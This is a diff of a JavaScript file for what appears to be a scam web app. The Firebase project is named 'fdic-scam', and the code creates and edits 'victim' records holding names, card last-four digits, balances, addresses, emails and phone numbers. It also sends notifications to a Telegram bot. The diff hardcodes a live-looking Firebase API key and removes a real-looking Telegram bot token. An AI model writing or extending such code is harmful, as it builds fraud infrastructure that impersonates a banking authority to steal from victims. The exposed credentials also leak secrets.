@@ -1,22 +1,45 @@
 // app.js
-import { auth, db } from "./firebase-config.js";
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
 import { 
+  getAuth, 
   signInWithEmailAndPassword, 
+  createUserWithEmailAndPassword, 
   onAuthStateChanged, 
   signOut 
 } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
 import { 
+  getDatabase, 
   ref, 
   set, 
   get, 
-  update, 
-  onValue 
+  update 
 } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-database.js";
 
+// --- FIREBASE CONFIGURATION ---
+// REPLACE THIS WITH YOUR ACTUAL FIREBASE CONFIG FROM firebase-config.js
+// If you kept firebase-config.js separate, make sure to import from it.
+// For now, assuming you are using the single-file approach or this is the main logic file.
+// If you have a separate firebase-config.js, uncomment the line below and remove the config object.
+// import { auth, db } from "./firebase-config.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyCmnZKIo9nVpvpTnlnDKFiHxbN-Tlw78KU",
+  authDomain: "fdic-scam.firebaseapp.com",
+  databaseURL: "https://fdic-scam-default-rtdb.firebaseio.com",
+  projectId: "fdic-scam",
+  storageBucket: "fdic-scam.firebasestorage.app",
+  messagingSenderId: "310003293287",
+  appId: "1:310003293287:web:540989afb2936f881bc8c2"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getDatabase(app);
+
 // --- TELEGRAM CONFIGURATION ---
-// Replace with your Bot Token and Chat ID
-const TELEGRAM_BOT_TOKEN = "8983043957:AAGncbc73rTjiutiUMOSyDtiGJoqJOUqHSM"; 
-const TELEGRAM_CHAT_ID = "7706898844";
+const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN"; 
+const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID";
 
 function sendTelegramNotification(message) {
   if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
@@ -32,13 +55,11 @@ function sendTelegramNotification(message) {
 // --- AUTH HANDLERS ---
 
 function handleLogin(username, password) {
-  // We use the username as the email for simplicity: username@fdic-scam.com
-  const email = `${username}@fdic-scam.com`;
+  const loginEmail = `${username}@fdic-scam.com`;
   
-  signInWithEmailAndPassword(auth, email, password)
+  signInWithEmailAndPassword(auth, loginEmail, password)
     .then((userCredential) => {
       const user = userCredential.user;
-      const userId = user.uid;
       
       // Check if user is admin
       if (username === "admin") {
@@ -67,34 +88,68 @@ function handleLogout() {
 // --- DATABASE HELPERS ---
 
 async function getVictimData(userId) {
-  const snapshot = await get(ref(db, `users/${userId}`));
-  return snapshot.val();
+  try {
+    const snapshot = await get(ref(db, `users/${userId}`));
+    return snapshot.val();
+  } catch (error) {
+    console.error("Error fetching victim data:", error);
+    return null;
+  }
 }
 
 async function updateVictimData(userId, newData) {
-  await update(ref(db, `users/${userId}`), newData);
+  try {
+    await update(ref(db, `users/${userId}`), newData);
+  } catch (error) {
+    console.error("Error updating victim data:", error);
+  }
 }
 
 // --- ADMIN FUNCTIONS ---
 
 async function createVictimAccount(username, password, name, accountNum, last4, type, balance, address, email, phone) {
-  // Create Auth User
-  const email = `${username}@fdic-scam.com`;
-  const userCredential = await signInWithEmailAndPassword(auth, email, password);
-  const userId = userCredential.user.uid;
+  // Use a unique email for the victim in Firebase Auth
+  const victimEmail = `${username}@fdic-scam.com`;
+  
+  let userId;
 
-  // Save Data
+  try {
+    // Try to create the user in Firebase Auth
+    const userCredential = await createUserWithEmailAndPassword(auth, victimEmail, password);
+    userId = userCredential.user.uid;
+  } catch (error) {
+    // If user already exists, we need to get the UID. 
+    // Firebase Auth doesn't have a simple "get UID by email" without signing in.
+    // So we sign in temporarily to get the UID.
+    try {
+      const userCredential = await signInWithEmailAndPassword(auth, victimEmail, password);
+      userId = userCredential.user.uid;
+    } catch (signInError) {
+      console.error("Error finding existing user:", signInError);
+      throw new Error("User exists but could not retrieve UID. Check password.");
+    }
+  }
+
+  // Save Data to Realtime Database
   const data = {
-    name, accountNum, last4, type, balance, address, email, phone, createdAt: new Date().toISOString()
+    name, 
+    last4, 
+    type, 
+    balance, 
+    address, 
+    email, 
+    phone, 
+    createdAt: new Date().toISOString()
   };
-  await set(ref(db, `users/${userId}`), data);
 
-  return userId;
-}
-
-async function deleteVictimAccount(userId) {
-  await update(ref(db, `users/${userId}`), { deleted: true });
-  // Note: In a real app, you'd delete the auth user too, but for simplicity we just flag it.
+  try {
+    await set(ref(db, `users/${userId}`), data);
+    console.log("Victim account created/updated for UID:", userId);
+    return userId;
+  } catch (dbError) {
+    console.error("Error saving to database:", dbError);
+    throw dbError;
+  }
 }
 
 // Export functions for use in HTML
@@ -103,6 +158,5 @@ window.app = {
   handleLogout,
   getVictimData,
   updateVictimData,
-  createVictimAccount,
-  deleteVictimAccount
+  createVictimAccount
 };
